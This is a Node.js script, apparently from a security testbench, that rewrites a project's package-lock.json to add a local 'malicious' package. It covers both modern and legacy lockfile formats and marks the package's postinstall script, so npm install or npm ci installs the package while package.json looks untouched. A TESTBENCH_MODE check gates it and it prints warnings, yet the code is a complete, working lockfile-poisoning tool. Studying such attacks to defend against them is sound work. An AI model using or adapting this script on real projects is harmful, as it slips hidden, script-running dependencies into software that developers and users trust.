#!/usr/bin/env node

/**
 * Lock File Manipulation Script
 *
 * EDUCATIONAL EXAMPLE: demonstrates injecting a package into package-lock.json
 * so `npm install` / `npm ci` materializes it even when package.json is clean.
 *
 * SAFETY: Only runs when TESTBENCH_MODE=enabled
 */

const fs = require('fs');
const path = require('path');

if (process.env.TESTBENCH_MODE !== 'enabled') {
  console.error('❌ TESTBENCH_MODE must be enabled');
  process.exit(1);
}

/**
 * npm v7+ lockfileVersion 2/3: entries live under `packages` (not top-level `dependencies`).
 */
function injectLockfileV3(lockFile, projectPath, maliciousPackagePath, maliciousPkg) {
  const name = maliciousPkg.name;
  const version = maliciousPkg.version;
  const absMalicious = path.resolve(projectPath, maliciousPackagePath);
  const relFromProject = path.relative(projectPath, absMalicious).split(path.sep).join('/');
  const fileSpec = relFromProject.startsWith('.') ? `file:${relFromProject}` : `file:./${relFromProject}`;

  lockFile.packages = lockFile.packages || {};
  const rootKey = '';
  const root = lockFile.packages[rootKey] || {};
  root.dependencies = root.dependencies || {};
  root.dependencies[name] = fileSpec;
  lockFile.packages[rootKey] = root;

  // Mirror npm's layout for file: workspace links (see npm-generated locks)
  const linkKey = relFromProject;
  if (!lockFile.packages[linkKey]) {
    lockFile.packages[linkKey] = { version };
  } else if (!lockFile.packages[linkKey].version) {
    lockFile.packages[linkKey].version = version;
  }

  const nmKey = `node_modules/${name}`;
  lockFile.packages[nmKey] = {
    resolved: linkKey,
    link: true,
  };

  if (maliciousPkg.scripts && maliciousPkg.scripts.postinstall) {
    lockFile.packages[nmKey].hasInstallScript = true;
    root.hasInstallScript = true;
    lockFile.packages[rootKey] = root;
  }

  return true;
}

/**
 * npm v6-style top-level `dependencies` on the lock object (legacy).
 */
function injectLegacyDependencies(lockFile, projectPath, maliciousPackagePath, maliciousPkg) {
  const maliciousPackageName = maliciousPkg.name;
  const maliciousPackageVersion = maliciousPkg.version;
  const absMalicious = path.resolve(projectPath, maliciousPackagePath);
  const relFromProject = path.relative(projectPath, absMalicious).split(path.sep).join('/');
  const fileResolved = relFromProject.startsWith('.') ? `file:${relFromProject}` : `file:./${relFromProject}`;

  if (!lockFile.dependencies) {
    lockFile.dependencies = {};
  }

  lockFile.dependencies[maliciousPackageName] = {
    version: maliciousPackageVersion,
    resolved: fileResolved,
    integrity: '',
    extraneous: false,
    requires: {},
  };

  if (maliciousPkg.dependencies) {
    Object.keys(maliciousPkg.dependencies).forEach((dep) => {
      lockFile.dependencies[maliciousPackageName].requires[dep] = maliciousPkg.dependencies[dep];
    });
  }

  if (maliciousPkg.scripts) {
    lockFile.dependencies[maliciousPackageName]._hasPostinstall = !!maliciousPkg.scripts.postinstall;
  }

  return true;
}

function manipulateLockFile(projectPath, maliciousPackagePath) {
  const packageLockPath = path.join(projectPath, 'package-lock.json');
  const maliciousPkgJson = path.join(
    path.isAbsolute(maliciousPackagePath)
      ? maliciousPackagePath
      : path.resolve(projectPath, maliciousPackagePath),
    'package.json'
  );

  if (!fs.existsSync(packageLockPath)) {
    console.error('❌ package-lock.json not found');
    return false;
  }

  if (!fs.existsSync(maliciousPkgJson)) {
    console.error('❌ Malicious package.json not found');
    return false;
  }

  const lockFile = JSON.parse(fs.readFileSync(packageLockPath, 'utf8'));
  const maliciousPkg = JSON.parse(fs.readFileSync(maliciousPkgJson, 'utf8'));
  const maliciousPackageName = maliciousPkg.name;
  const maliciousPackageVersion = maliciousPkg.version;

  console.log(`🔧 Injecting "${maliciousPackageName}@${maliciousPackageVersion}" into lock file...`);

  const lv = Number(lockFile.lockfileVersion) || 1;
  if (lockFile.packages && lv >= 2) {
    injectLockfileV3(lockFile, projectPath, maliciousPackagePath, maliciousPkg);
  }

  injectLegacyDependencies(lockFile, projectPath, maliciousPackagePath, maliciousPkg);

  fs.writeFileSync(packageLockPath, JSON.stringify(lockFile, null, 2));

  console.log(`✅ Successfully injected "${maliciousPackageName}" into package-lock.json`);
  console.log('');
  console.log('⚠️  WARNING: package-lock.json has been manipulated!');
  console.log('   The malicious package is now recorded in the lock file');
  console.log('   (compare with package.json and run npm install / npm ci to observe behavior)');
  console.log('');
  console.log('   When npm install or npm ci runs, it will install');
  console.log('   the malicious package based on the lock file.');
  console.log('');

  return true;
}

if (require.main === module) {
  const projectPath = process.argv[2] || process.cwd();
  const maliciousPackagePath = process.argv[3] || path.join(__dirname, '../malicious-packages/evil-utils');

  if (!fs.existsSync(projectPath)) {
    console.error(`❌ Project path not found: ${projectPath}`);
    process.exit(1);
  }

  if (!fs.existsSync(path.resolve(projectPath, maliciousPackagePath))) {
    console.error(`❌ Malicious package path not found: ${maliciousPackagePath}`);
    process.exit(1);
  }

  manipulateLockFile(projectPath, maliciousPackagePath);
}

module.exports = { manipulateLockFile };
